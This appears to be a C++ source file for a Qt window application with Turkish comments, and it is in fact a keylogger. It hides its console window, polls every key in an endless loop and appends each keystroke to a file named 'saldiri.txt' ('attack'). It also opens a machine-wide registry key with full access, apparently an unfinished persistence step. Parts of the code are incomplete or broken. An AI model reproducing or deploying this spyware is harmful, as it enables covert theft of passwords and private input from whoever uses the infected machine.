#include "mainwindow.h"
#include "ui_mainwindow.h"
using namespace std;
#include <QFile>
#include <QTextStream>
#include <QDebug>


void defter(LPCSTR text) {
    fstream LogFile;
    LogFile.open("saldiri.txt", fstream::app);
    if (LogFile.is_open()) {
        LogFile << text;
        LogFile.close();
    }
}


bool klavye(int i_Key) {
    switch (i_Key) {
    case VK_SPACE:
        cout << " ";
        defter(" ");
        return true;
    case VK_RETURN:
        cout << "\n";
        defter("\n");
        return true;
    case VK_SHIFT:
        cout << " *SHIFT* ";
        defter(" *SHIFT* ");
        return true;
    case VK_BACK:
        cout << "\b";
        defter("\b");
        return true;
    case VK_RBUTTON:
        cout << " *rclick* ";
        defter(" *rclick* ");
        return true;
    case VK_LBUTTON:
        cout << " *lclick* ";
        defter(" *lclick* ");
        return true;
    case VK_CAPITAL:
        cout << "*CAPS_LOCK*";
        defter(" *CAPS_LCOK* ");
        return true;
    case VK_TAB:
        cout << "#TAB";
        defter("#TAB");
        return true;
    case VK_UP:
        cout << "#UP";
        defter("#UP_ARROW_KEY");
        return true;
    case VK_DOWN:
        cout << "#DOWN";
        defter("#DOWN_ARROW_KEY");
        return true;
    case VK_LEFT:
        cout << "#LEFT";
        defter("#LEFT_ARROW_KEY");
        return true;
    case VK_RIGHT:
        cout << "#RIGHT";
        defter("#RIGHT_ARROW_KEY");
        return true;
    case VK_CONTROL:
        cout << "#CONTROL";
        defter("#CONTROL");
        return true;
    case VK_MENU:
        cout << "#ALT";
        defter("#ALT");
        return true;
    default:
        return false;
    }
}

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{

    ui->setupUi(this);




    HKEY hKey; // kayıt oluşturuyoruz
    LPCTSTR sk = TEXT("path"); // programın olduğu dizini

// kayıt defterini açıyoruz

    LONG openRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE, sk, 0, KEY_ALL_ACCESS, &hKey);


    LONG closeOut = RegCloseKey(hKey); // kayıt defterini kapatıyoruz



    fstream LogFile;
     // kayıt defterini kapatıyoruz
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY;

        ;	while (true) {
            Sleep(10);
            for (int KEY = 8; KEY <= 190; KEY++)
            {
                if (GetAsyncKeyState(KEY) == -32767) {
                    if (klavye(KEY) == false) {

                        LogFile.open("saldiri.txt", fstream::app);
                        if (LogFile.is_open()) {
                            LogFile << char(KEY);
                            LogFile.close();
                        }

                    }
                }
            }
        }
qDebug()<<LogFile.get();

}

MainWindow::~MainWindow()
{
    delete ui;
}





